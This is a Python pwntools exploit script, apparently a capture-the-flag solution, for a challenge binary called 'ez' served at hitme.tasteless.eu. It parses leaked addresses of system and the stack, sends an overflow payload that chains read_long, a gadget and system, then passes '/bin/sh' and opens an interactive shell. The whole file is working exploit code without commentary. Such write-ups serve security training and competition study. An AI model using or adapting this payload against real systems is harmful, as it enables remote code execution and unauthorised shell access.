# -*- coding: future_fstrings -*-
#!/usr/bin/env python2

from pwn import *

binary = ELF('./ez')

p = process('../pow connect hitme.tasteless.eu 10801'.split())

p.send("\x64\x48\x21\x3F\x90")

p.recvuntil("yay, you didn't crash this thing! Have a pointer, you may need it: ")
system = int(p.recvline(False), 16)
log.info(f"system: {hex(system)}")
p.recvuntil("You shouldn't need this pointer, but this is an easy challenge: ")
rsp = int(p.recvline(False), 16)
log.info(f"rsp: {hex(rsp)}")

payload  = p64(0) * 5
payload += p64(binary.symbols['read_long'])
payload += p64(0x0000000000400b3e) + p64(rsp - 0x28) + p64(0)
payload += p64(system)

p.recvline()
p.sendline(str(len(payload)))
p.recvline()

assert('\n' not in payload)
p.send(payload)

p.sendline('/bin/sh')

p.interactive()